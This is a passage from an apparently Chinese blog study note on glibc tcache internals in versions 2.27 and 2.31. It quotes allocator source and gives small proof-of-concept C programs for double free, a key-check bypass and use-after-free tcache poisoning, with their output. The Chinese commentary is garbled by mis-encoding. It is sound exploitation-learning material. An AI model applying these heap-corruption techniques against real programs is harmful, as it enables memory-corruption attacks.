chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk3: %p\n&quot;</span>, chunk3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk4: %p\n&quot;</span>, chunk4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 227.c -o 227 -no-pie -g -O0 -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span></span><br><span class="line">fake_chunk1: <span class="number">0x24dd280</span></span><br><span class="line">fake_chunk2: <span class="number">0x24dd2a0</span></span><br><span class="line">chunk2: <span class="number">0x24dd260</span></span><br><span class="line">chunk3: <span class="number">0x24dd280</span></span><br><span class="line">chunk4: <span class="number">0x24dd2a0</span></span><br></pre></td></tr></table></figure>



<p>å¹¶ä¸”è°ƒè¯•è§‚å¯Ÿå½“<code>chunk2 = malloc(0x10);</code>ä¹‹å<code>tcache-&gt;count[tc_idx] = 0</code></p>
<p>æ¥ç€å½“<code>chunk3 = malloc(0x10);</code>ä¹‹å,<code>tcache-&gt;count[tc_idx] = 255 </code>,å‘ç”Ÿäº†æ•´æ•°ä¸‹æº¢</p>
<p>åªèƒ½è¯´<code>glibc-2.27</code>ä¸Šçš„<code>tcache</code>æ˜¯å¾ˆç®€é™‹çš„</p>
<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;	<span class="comment">//æ”¾å›å †å—åˆ°tcacheæ—¶æ ¹æ®countså†³å®šå¯¹åº”æ¡¶æ˜¯å¦å·²ç»å­˜æ»¡</span></span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><code>tcache-&gt;counts[tc_idx]</code>ç»ˆäºå‘æŒ¥ä½œç”¨äº†,åŸæ¥æ˜¯ä¸æƒ³éå†é“¾è¡¨ç»Ÿè®¡å †å—ä¸ªæ•°,ç›´æ¥çœ‹<code>counts</code>å·æ‡’</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>free</code>æ—¶æ ¹æœ¬æ²¡æœ‰æ£€æŸ¥, ç”šè‡³åç›®ä»—èƒ†çš„<code>double free</code>éƒ½æ²¡äº‹, å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk);<span class="comment">//å°±æ˜¯æ˜ç›®å¼ èƒ†double free</span></span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    </span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># ldd 227_df</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff22cdd000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f9b9aab4000</span>)</span><br><span class="line">        /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f9b9ae68000</span>)</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span>_df</span><br><span class="line">chunk1 @ <span class="number">0xf6d260</span></span><br><span class="line">chunk2 @ <span class="number">0xf6d260</span></span><br></pre></td></tr></table></figure>



<h3 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc-2.31"></a>glibc-2.31</h3><h4 id="datastructure-1"><a href="#datastructure-1" class="headerlink" title="datastructure"></a>datastructure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>			<span class="comment">//å¦‚æœkeyç­‰äºglibcæ—¢å®škeyå€¼è¯´æ˜æœ¬å †å—æ˜¯å·²ç»è¢«é‡Šæ”¾çš„</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><code>glibc-2.29</code>ä¹‹å, <code>tcache_entry</code>ç»“æ„ä¸­åŠ å…¥äº†ä¸€ä¸ªkeyå­—æ®µ, å½“ä½¿ç”¨<code>tcache_put</code>æŠŠå †å—æŒ‚åˆ°<code>tcache</code>ä¸­æ—¶, å…¶<code>key</code>å­—æ®µå‡è¢«è®¾ç½®ä¸º<code>tcache</code>çš„åœ°å€</p>
<p>ä»¥<code>glibc-2.31</code>ä¸ºä¾‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)<span class="comment">//é€šè¿‡countsæ£€æŸ¥æ˜¯å¦æœ‰å‰©ä½™å †å—,è€Œä¸æ˜¯é€šè¿‡é“¾è¡¨æ˜¯å¦æŒ‡å‘ç©º</span></span><br><span class="line">    &#123;		</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>ä¸glibc-2.27ä¸­åŒºåˆ«çš„ä¸€ç‚¹æ˜¯, 2.31ä¸­åˆ¤æ–­idxå¯¹åº”æ¡¶å­ä¸­æ˜¯å¦æœ‰å †å—, ä¾æ®æ˜¯<code>tcache-&gt;counts[tc_idx] &gt; 0</code>,  ä¸å†çœ‹<code>entries</code>æ˜¯å¦ä¸ºç©º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// malloc_hook</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°tcacheå †å—ä¸ä¼šæœ‰å¯¹é½æ£€æŸ¥</p>
<p>å †å—ä»tcacheä¸­æ‹¿å‡ºæ¥ä¹‹å‰ä¼šå°†keyå½’é›¶, é˜²æ­¢æ³„éœ²tcacheåœ°å€</p>
<h5 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">        <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">            tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">               trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">               2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">               coincidence before aborting.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">            &#123;	<span class="comment">//å¦‚æœæ£€æŸ¥åˆ°e-&gt;key == tcache, è¯´æ˜å¯èƒ½å­˜åœ¨double free ,å› ä¸ºè‡ªç„¶æƒ…å†µä¸‹å †å—ä¸­çš„æ•°æ®ç­‰äºtcacheåœ°å€æ¦‚ç‡å¤ªå°äº†</span></span><br><span class="line">                <span class="comment">//ä¸ºäº†é¿å…è¯¯æ€, ä¸‹é¢è¿˜æ˜¯è¦å†æ¬¡ç¡®å®šä¸€ä¸‹, tcacheç›¸å…³æ¡¶å­é‡Œæ˜¯å¦çœŸçš„æœ‰è¿™ä¸ªå †å—</span></span><br><span class="line">                <span class="comment">//å¦‚æœçœŸæœ‰åˆ™è¯´æ˜çœŸçš„double freeäº†</span></span><br><span class="line">                <span class="comment">//ä¹Ÿå°±æ˜¯è¯´e-&gt;key == tcache æ˜¯è¿™ä¸ªè¯Šæ–­æµç¨‹çš„å¯¼ç«ç´¢</span></span><br><span class="line">                tcache_entry *tmp;</span><br><span class="line">                LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">                <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<span class="comment">//ä»å¤´å¾€åéå†åˆ¤æ–­å·²æœ‰çš„å †å—æ˜¯ä¸æ˜¯å½“å‰è¦æ’å…¥çš„å †å—</span></span><br><span class="line">                     tmp;</span><br><span class="line">                     tmp = tmp-&gt;next)</span><br><span class="line">                    <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	<span class="comment">//æ ¹æ®countsåˆ¤æ–­æ˜¯å¦å·²ç»è£…æ»¡</span></span><br><span class="line">            &#123;</span><br><span class="line">                tcache_put(p, tc_idx);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>ç›¸æ¯”äº<code>glibc-2.27</code>, åŠ å…¥äº†æ”¾å›å †å—å‰çš„<code>double free</code>æ£€æŸ¥, ä½†æ˜¯è¯¥æ£€æŸ¥å¾ˆå®¹æ˜“ç»•è¿‡</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="comment">//å‡è®¾æº¢å‡ºä¿®æ”¹chunkmem, ä»¥ç»•è¿‡å¯¹keyçš„æ£€æŸ¥</span></span><br><span class="line">    chunk[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">//next</span></span><br><span class="line">    chunk[<span class="number">1</span>] = <span class="number">0</span>;	<span class="comment">//key</span></span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 231_df.c -o 231_df -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">231</span>_df</span><br><span class="line">chunk1 @ <span class="number">0x5572b2c55260</span></span><br><span class="line">chunk2 @ <span class="number">0x5572b2c55260</span></span><br></pre></td></tr></table></figure>

<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>glibc2.31ä¸­çš„åˆ©ç”¨æ‰‹æ®µ,åŸºæœ¬ä¸Šéƒ½æ˜¯é’ˆå¯¹nextæŒ‡é’ˆæ²¡æœ‰çº¦æŸ, æ”»å‡»è€…å¯ä»¥éšä¾¿ä¿®æ”¹ä¹‹</p>
<h4 id="Use-After-Free-å¯¼è‡´-tcache-entry-poisoning"><a href="#Use-After-Free-å¯¼è‡´-tcache-entry-poisoning" class="headerlink" title="Use After Free å¯¼è‡´ tcache entry poisoning"></a>Use After Free å¯¼è‡´ tcache entry poisoning</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> * chunk_victim;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = buffer;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_victim now points to %p\n &quot;</span>,chunk_victim);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc uaf.c -o uaf -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./uaf</span><br><span class="line">chunk_victim now points to 0x7fff53e7c010</span><br></pre></td></tr></table></figure>



